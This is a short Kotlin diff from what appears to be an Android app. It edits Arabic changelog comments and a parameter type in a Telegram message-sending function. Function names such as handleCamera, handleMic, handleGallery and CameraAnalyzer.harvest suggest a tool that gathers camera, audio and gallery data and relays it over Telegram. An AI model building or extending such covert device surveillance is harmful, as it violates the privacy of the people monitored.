@@ -26,11 +26,9 @@ import kotlin.random.Random
  * - تعديل handleCamera لتمرير tg و threadId إلى CameraAnalyzer.harvest.
  * - تعديل sendTelegramVoice و sendTelegramDocument لاستقبال threadId واستخدام TelegramUi مباشرة.
  * - تعديل handleMic لتمرير threadId إلى sendTelegramVoice.
- * - ✅ إصلاح خطأ Type mismatch في sendTelegramMessage: تغيير chatId إلى Any وتحويله إلى String داخلياً.
- * - ✅ تحويل جميع استدعاءات sendTelegramMessage التي تستخدم cid إلى cid.toString() لضمان التوافق.
+ * - ✅ **إصلاح جذري لنوع chatId في sendTelegramMessage:** تغيير chatId إلى Any وتحويله إلى String داخلياً.
+ * - ✅ تحويل جميع استدعاءات sendTelegramMessage التي تستخدم cid إلى cid.toString().
  * - ✅ التأكد من أن جميع استدعاءات sendTelegramMessage في sendTextFile تستخدم chatId.toString().
- * - ✅ إصلاح جميع الاستدعاءات في جميع الدوال (execute, handleCamera, handleGallery, ...).
- * - ✅ إضافة تحويل chatId إلى String في sendTelegramMessage باستخدام when للتأكد من أنه String.
  */
 class Commands private constructor(context: Context) {
 
@@ -1390,11 +1388,11 @@ class Commands private constructor(context: Context) {
 
     /**
      * إرسال رسالة نصية عبر Telegram (مع منع تسريب كلمة السر)
-     * ✅ تم تعديل chatId إلى Any لاستقبال أي نوع، وتحويله إلى String داخلياً
+     * ✅ **التغيير الجذري**: تم تغيير chatId إلى Any لاستقبال أي نوع، وتحويله إلى String داخلياً.
      */
     private suspend fun sendTelegramMessage(
         tg: Any?,
-        chatId: Any,  // ✅ تغيير إلى Any لقبول Long و String
+        chatId: Any,  // ✅ تغيير من String? إلى Any
         text: String,
         replyMarkupJson: String? = null,
         receivingToken: String? = null,
